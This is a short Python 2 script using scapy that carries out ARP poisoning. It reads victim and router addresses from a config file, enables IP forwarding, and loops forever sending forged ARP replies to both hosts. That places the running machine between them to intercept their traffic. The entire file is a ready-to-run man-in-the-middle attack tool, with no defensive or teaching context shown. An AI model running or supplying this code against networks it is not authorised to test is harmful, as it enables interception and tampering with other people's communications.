#!/usr/bin/python

from threading import *
from scapy.all import *
import sys
import signal
import time


# Reads the config file for IP's/MAC's, interface and redirectIP
with open('config1.txt', 'r') as config:
	victimIP = config.readline().replace('\n', '')
	routerIP = config.readline().replace('\n', '')
	routerMAC = config.readline().replace('\n', '')
	victimMAC = config.readline().replace('\n', '')
	config.close()

# Sets packet forwarding
with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
    ipf.write('1\n')

#signal handler for SIGINT (CTRL-C)
def sigint_handler (signum, frame):
    print 'CTRL-C Detected....exit'
    sys.exit(0)

# Sends the ARP poisoning packets
def poison(routerIP, victimIP, routerMAC, victimMAC):
    print 'ARP poisoning'
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

# Constructs the ARP spoofing Thread
class arpSpoofThread (Thread):
    def __init__(self, threadID, name, delay):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
    
    def run(self):
	 while 1:
        	poison(routerIP, victimIP, routerMAC, victimMAC)
        	time.sleep(1.5)

def main():
    
    # Register the signal handlers
    signal.signal (signal.SIGINT, sigint_handler)
    signal.signal (signal.SIGTERM, sigint_handler)
    # Creates and starts the Threads
    t1 = arpSpoofThread(1, 'arp_spoofing', 0)   #create thread
    #t1.daemon = True
    #print 'Threads created'
    print 'Threads started\n'
    t1.start()
    t1.join()
       
if __name__ == '__main__':
      main()
